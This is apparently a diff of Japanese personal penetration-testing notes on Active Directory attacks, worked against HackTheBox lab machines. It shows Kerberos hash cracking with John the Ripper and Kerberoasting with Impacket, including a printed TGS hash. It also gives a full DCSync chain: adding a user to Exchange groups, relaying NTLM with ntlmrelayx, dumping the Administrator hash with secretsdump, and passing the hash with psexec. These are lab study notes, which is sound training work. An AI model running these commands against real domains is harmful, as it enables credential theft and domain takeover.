@@ -168,7 +168,9 @@ https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility
 
   ※disableとついてると失敗？？
 
-* 以下コマンドでもhashdump可能
+  ※そもそも全部ハッシュが同じで上記コマンドはおかしいかも
+
+* 以下コマンドでもhashdump可能　※samdamp2と結果が異なることがあるので両方とも実行すること
 
   https://www.thehacker.recipes/ad/movement/ntlm/pth
 
@@ -327,4 +329,104 @@ kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rocky
 $krb5asrep$dave@corp.com:ae43ca9011cc7e7b9e7f7e7279dd7f2e$7d4c59410de2984edf35053b7954e6dc9a0d16cb5be8e9dcacca88c3c13c4031abd71da16f476eb972506b4989e9aba2899c042e66792f33b119fab1837d94eb654883c6c3f2db6d4a8d44a8d9531c2661bda4dd231fa985d7003e91f804ecf5ffc0743333959470341032b146ab1dc9bd6b5e3f1c41bb02436d7181727d0c6444d250e255b7261370bc8d4d418c242abae9a83c8908387a12d91b40b39848222f72c61ded5349d984ffc6d2a06a3a5bc19ddff8a17ef5a22162baade9ca8e48dd2e87bb7a7ae0dbfe225d1e4a778408b4933a254c30460e4190c02588fbaded757aa87a:Flowers1
 ...# 最後のコロンがパスワード
 ```
+
+※ John the ripperの方が100倍早いし、コマンドも簡単
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt crack_file   
+```
+
+
+
+### Kerberoast(remote) Impacket GetUsersSPNs
+
+https://github.com/fortra/impacket
+
+```
+python GetUserSPNs.py -dc-ip 10.129.191.179 active.htb/SVC_TGS
+```
+
+```
+python GetUserSPNs.py -dc-ip 10.129.191.179 active.htb/SVC_TGS -request
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$5f14c8dd5c3cca9415ff2faea86c79a4$157e56b1df1a0b1d83ee4fc7e931e2a557c6e018a7d553d456edfe9cc7291c8dbdb7af43c4619b120607660d4521b8df3ff2aee1643271b3b29a8fffa6f425fcab1f7b98d440c24e67385d8b1aa406294fb9551de0441c32227f84d7368776567198a376ad620bc08def6f18b0502925a00ff091eb34ff2e64aac27d8920be1e245fb10e85e345d0cd0fa643c72cbc13ac406cda228ddd589a30852db951c75943f8ce03799de1408a869dfe560834d6ddb9f3518f4c9ba38675783a7680afb5fa3ad58ee335ccd8d47085a897ace74854c1b362a50fcf63f3f0ca34d05da0569a4f32bda31aa4b1dee67d5d199fc01a50d375b8617f3a073344a1393327ff854e2ae15c2419d8f72c88ab7837a6808af322908088f28a07c89bd19a85ee26dcd4032626eea7c12329bcbc71793372e94ebd47d83b437cf8e6babcaf2c087af8a9f67475a078510a3ae47a32613ee1866adf8e62b8f02289b5d782bdec197eb69de6a3bdbcd7b157f058208fc55c29ce0e66de8467e6baec745bb48316256d8b6b639262c01fd7977910a380faf3d8519e70e6e019cf4064db4b295144528bf08639e015c134c6f010cb5b3f71611be45cdcaeb9a542f7382d899bb2b0b2192c3d26db87a6b9bacf41ed3cb21a2c6a82d5add11f429b41fbc29d7c7d4c96ed3bba4b3b57e07ac9f94269d02f483705fdf6ef6c087d0044658cf45b489553b1cdbbd039bc041aee4478ae15a5645ef98b85737d895768a2110fd2c7d689f738735f234625561cf11d6b5f9153e157bbae3d87fa1293f2b0cd192a633162454eea1c814e9c7668ff3d3a9a23ffde18f5befcf494a911a791da8289c06df768a0ed9ab204194e74ae564a28dde53b4d198d0de6432c2cd5d8de3ee72ee1716f83dc35ecb454c658bfa9d24d3a83b5bbe3a0dd7d20076985e92337a6b6844763f74a02f1fd0226a81283e3d5bf84b0245a5bbf4da2aa85dc34e9cb398c675cd561399322c5b8fa21b49887eaa4a2a39d672177db9467ea758d7de9b1842e50c61508bc41e272de5be351f1c57cac4f01212b6a7a2f69d72eed44e51078525039c058c3d5bcf838ede5759add259e21c819306d028b927f5cd177939119ad46aa2d21ef1dc71d98a0c2dac77d97df43159d346222cb0de725448b43730da48ed260f0360582b0e1dc2b4274838b6354cdd0dd2dd2c07769ce7e998b383f5321f9605d66c96cbda41c916edf774cad32d0edab1fdd682f67a5bca29d21
+```
+
+```bash
+john --format=krb5tgs crack_file --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+### DCsync(Exchange Server)
+
+[詳細の説明サイト](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
+
+前提条件
+
+* domainユーザを追加できる権限を持っていること
+
+  * `Account Operators`グループに所属していること
+
+    ![image-20230430113803701](img/ActiveDirectory_auth/image-20230430113803701.png)
+
+  * ![image-20230430113852468](img/ActiveDirectory_auth/image-20230430113852468.png)
+
+* **Exchange server**に関連するグループがあること
+
+  ![image-20230430113929667](img/ActiveDirectory_auth/image-20230430113929667.png)
+
+  → `Exchange Trusted Subsystem`/`Exchange Windows Permissions`
+
+1. `Exchange Trusted Subsystem`のセキュリティグループのユーザを作成する(デフォルトではwriteDACL 権限を持つ Exchange Windows Permissions セキュリティグループのメンバーになっています。)
+
+   ```powershell
+   # [Forest Box] - WinRM Session
+   PS C:\> net user bigb0ss bigb0ss /add /domain
+   PS C:\> net group "Exchange Trusted Subsystem" bigb0ss /add /domain
+   ```
+
+   ![image-20230430094432907](img/ActiveDirectory_auth/image-20230430094432907.png)
+
+2. ntlmrelayx.py man-in-the-middle ("mitm")ツールを --escalate-userフラグ付きで実行する。これにより、同じネットワーク上の「bigb0ss」ユーザーのログイン試行を識別すると、mitmは自動的にユーザー権限をチェックし、ドメインACLを変更できる場合は、ユーザー権限を変更して、ユーザーアカウントにReplication-Get-Changes-All権限を追加し、DCSyncを実行することができます。
+
+   ```
+   cp /usr/share/doc/python3-impacket/examples/ntlmrelayx.py ./
+   sudo systemctl stop smbd
+   ```
+
+   ```bash
+   # [My Kali Box] - Screen #1
+   $ ntlmrelayx.py -t ldap://10.129.192.240 --escalate-user bigb0ss
+   ```
+
+3. 次に、"bigb0ss "アカウントを使用してランダム認証を行います。今回は、psexec.pyを使って、自分のKaliボックスに対して認証の試行を行いました。
+
+   ```bash
+   [My Kali Box] - Screen #2
+   $ psexec.py htb.local/bigb0ss:bigb0ss@10.10.14.75
+   ```
+
+   明らかに、SMBサービスは私のKaliボックス上で実行されていないため、これは失敗します。そして、それはとにかく私のボックスのための有効なクレジットではないでしょう。
+
+   ![image-20230430100142299](img/ActiveDirectory_auth/image-20230430100142299.png)
+
+4. しかし、ntlmrelay.pyツールは、htb.local/bigb0ss:bigb0ssの認証試行をキャプチャしたものをldap:/10.10.10.161（フォレストボックス）に中継する。そして、それはフォレストボックスへの有効な認証情報であるため、正常に認証され、Replication-Get-Changes-Allを追加するために私たちの権限をエスカレートさせることができます。
+
+5. 昇格した権限で、secretsdump.py ツールを使用して、DCSync を実行して "Administrator" ユーザーの NTLM ハッシュをダンプすることができます。
+
+   ```bash
+   ### DCSync
+   $ secretsdump.py htb.local/bigb0ss:bigb0ss@10.129.192.240 -just-dc-user administrator
+   ```
+
+   ![image-20230430114317019](img/ActiveDirectory_auth/image-20230430114317019.png)
+
+   ```bash
+   htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+   ```
+
+   ```bash
+   psexec.py htb.local/administrator@10.129.192.240 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+   ```
+
+   ![image-20230430114326966](img/ActiveDirectory_auth/image-20230430114326966.png)
 
